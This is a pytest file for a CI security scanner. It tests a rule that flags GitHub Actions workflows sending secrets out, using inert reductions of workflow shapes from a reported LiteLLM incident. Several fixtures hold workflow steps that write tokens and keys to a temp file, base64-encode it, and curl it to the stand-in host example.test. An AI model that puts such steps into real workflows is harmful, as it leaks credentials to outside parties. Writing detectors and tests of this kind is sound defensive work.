"""Inert CI cases derived from the October 2026 LiteLLM workflow evidence.

These are authored reductions of the two recovered workflow shapes, not copies
of attacker artifacts or a measurement of field accuracy. The original commits
were b69bc36fd4e23b23ea09f4ce63a92b07258f5044 and
1a6e3c1e41f1b5c8eeaeeb2ae94bcd95390fa891. See
https://docs.litellm.ai/blog/security-incident-oct-21-2026-attack-chain
and https://socket.dev/blog/litellm-attack-timeline.

The endpoint is inert; these tests only parse source and never run a workflow.
"""

from __future__ import annotations

from pathlib import Path

from taintly.engine import scan_file
from taintly.models import Platform, Severity
from taintly.rules.registry import load_rules_for_platform


def _body_findings(tmp_path: Path, source: str):
    path = tmp_path / ".github" / "workflows" / "cache.yml"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(source, encoding="utf8")
    return [
        finding
        for finding in scan_file(str(path), load_rules_for_platform(Platform.GITHUB))
        if finding.rule_id == "SEC6-GH-019"
    ]


def test_oct10_shape_bundles_two_secrets_into_one_encoded_request(tmp_path: Path) -> None:
    source = """name: cache
on: [push]
permissions: {}
jobs:
  collect:
    runs-on: ubuntu-latest
    steps:
      - name: setup
        env:
          FIRST: ${{ secrets.GH_TOKEN }}
          SECOND: ${{ secrets.APP_PRIVATE_KEY }}
        run: |
          echo "GH_TOKEN=${FIRST}" > /tmp/c.env
          echo "APP_PRIVATE_KEY=${SECOND}" >> /tmp/c.env
          base64 -w0 /tmp/c.env > /tmp/c.b64
          curl -m 25 -s -X POST https://example.test/collect -H 'Content-Type: text/plain' --data-binary @/tmp/c.b64 || true
"""
    findings = _body_findings(tmp_path, source)

    assert len(findings) == 1
    finding = findings[0]
    assert finding.severity == Severity.MEDIUM
    assert finding.review_needed
    evidence = " ".join(finding.context_notes)
    assert "job collect, step 0" in evidence
    assert "GH_TOKEN" in evidence
    assert "APP_PRIVATE_KEY" in evidence
    assert "file-append" in evidence
    assert "base64-file-transform" in evidence
    assert "http-request-body" in evidence


def test_oct12_shape_keeps_environment_jobs_and_secret_origins_separate(
    tmp_path: Path,
) -> None:
    source = """name: cache
on: [push]
permissions: {}
jobs:
  e2e:
    runs-on: ubuntu-latest
    environment: e2e
    steps:
      - name: setup
        env:
          SESSION: ${{ secrets.E2E_SESSION }}
        run: |
          echo "SESSION=${SESSION}" > /tmp/c.env
          base64 -w0 /tmp/c.env > /tmp/c.b64
          curl -s -X POST https://example.test/collect --data-binary @/tmp/c.b64 || true
  database:
    runs-on: ubuntu-latest
    environment: integration
    steps:
      - name: setup
        env:
          PASSWORD: ${{ secrets.DATABASE_PASSWORD }}
        run: |
          echo "PASSWORD=${PASSWORD}" > /tmp/c.env
          base64 -w0 /tmp/c.env > /tmp/c.b64
          curl -s -X POST https://example.test/collect --data-binary @/tmp/c.b64 || true
"""
    findings = _body_findings(tmp_path, source)

    assert len(findings) == 2
    evidence = [" ".join(finding.context_notes) for finding in findings]
    e2e = next(note for note in evidence if "job e2e, step 0" in note)
    database = next(note for note in evidence if "job database, step 0" in note)
    assert "E2E_SESSION" in e2e
    assert "DATABASE_PASSWORD" not in e2e
    assert "DATABASE_PASSWORD" in database
    assert "E2E_SESSION" not in database


def test_same_temporary_path_in_another_job_does_not_create_a_flow(
    tmp_path: Path,
) -> None:
    source = """name: cache
on: [push]
jobs:
  collect:
    runs-on: ubuntu-latest
    steps:
      - env:
          TOKEN: ${{ secrets.GH_TOKEN }}
        run: |
          echo "$TOKEN" > /tmp/c.env
  upload:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -s https://example.test/collect --data-binary @/tmp/c.env
"""
    assert not _body_findings(tmp_path, source)


def test_authentication_header_does_not_make_public_body_a_secret_flow(
    tmp_path: Path,
) -> None:
    source = """name: cache
on: [push]
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - env:
          TOKEN: ${{ secrets.GH_TOKEN }}
        run: |
          echo public > /tmp/status.txt
          curl -s https://example.test/api -H "Authorization: Bearer $TOKEN" --data-binary @/tmp/status.txt
"""
    assert not _body_findings(tmp_path, source)
